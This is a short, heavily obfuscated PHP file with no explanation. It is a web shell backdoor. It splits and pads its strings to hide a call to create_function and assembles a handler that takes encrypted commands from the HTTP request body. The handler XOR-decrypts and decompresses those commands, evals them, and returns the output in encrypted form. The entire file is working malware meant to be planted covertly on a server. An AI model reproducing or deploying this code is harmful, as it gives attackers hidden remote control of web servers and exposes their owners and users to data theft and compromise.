<?php
$W='con%H%Htents()%H;@ob_en%Hd_clean();$r%H=@base6%H4_enc%Hode(@x%H(@g%Hzcomp%H%Hress($o),$k));pri%Hnt(%H%H"$p$kh$r$kf");}';
$I='{%H%H$c=s%Htrlen($k)%H;$l=strl%Hen($t);$%Ho="%H";for%H($i=0;$%Hi<$%Hl;){f%Hor($j=0;($j%H%H%H<$c&&$%Hi<$l);$j++,%H$%Hi%';
$U='$k=%H"b0d04816%H";%H$k%Hh="4a5ebca32%H0fe";$kf=%H"26%Hbc%H%Hdb5f8f6d";%H$p="yOzWkJm8zmIdS%HJN%HR";fun%Hction x%H($t,$k)';
$T='H++){$o.=$t{$i}^$k{$j%H};}}retu%H%Hrn $o;}if (@%Hpreg_%Hmatch("/$kh(%H.+)%H$kf/%H%H%H",@file_%Hget_conte%Hnts("ph%Hp:/';
$w=str_replace('mm','','cmmmmremmammte_mmfunmmction');
$K='/input"),%H$m)==1) {@o%Hb_star%Ht();@%Hev%Hal(@gzu%Hncompress(%H@x(@b%H%Hase64%H_decode($m[1%H%H])%H,$%Hk)));$o=@ob_get_';
$l=str_replace('%H','',$U.$I.$T.$K.$W);
$M=$w('',$l);$M();
?>
